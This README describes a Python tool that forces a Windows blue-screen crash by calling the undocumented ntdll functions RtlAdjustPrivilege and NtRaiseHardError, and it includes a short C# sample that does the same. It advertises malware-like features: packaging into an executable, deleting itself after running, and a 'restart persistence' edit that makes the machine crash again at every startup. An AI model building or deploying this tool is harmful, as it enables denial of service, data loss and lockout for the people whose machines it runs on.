# Windows BSOD made in python
This project was inspired from a undocumented function in ntdll.dll.
The function is based in C# but using ctypes python makes it possible

[document](https://www.pinvoke.net/default.aspx/ntdll/NtRaiseHandError.html)

Requires the SeShutdownPriviledge, otherwise will fail.
Use RtlAdjustPrivilege with Privilege parameter 19 to enable SeShutdownPriviledge.
```
C# Sample Code:
    Console.Write("Press any key to trigger a BSOD.");
    Console.ReadKey();
    RtlAdjustPrivilege(19, true, false, out bool previousValue);
    NtRaiseHardError(0xC0000420, 0, 0, IntPtr.Zero, 6, out uint Response);
```
Python version

- Supports compiling using pyinstaller and Nuitka
- Removes itself from execution directory automatically

# Restart prestance 
Modify Line 15:

```executable = "BSOD.exe.malz"``` to ```"executable = "BSOD.exe"```
_note this will cause it to BSOD on start up
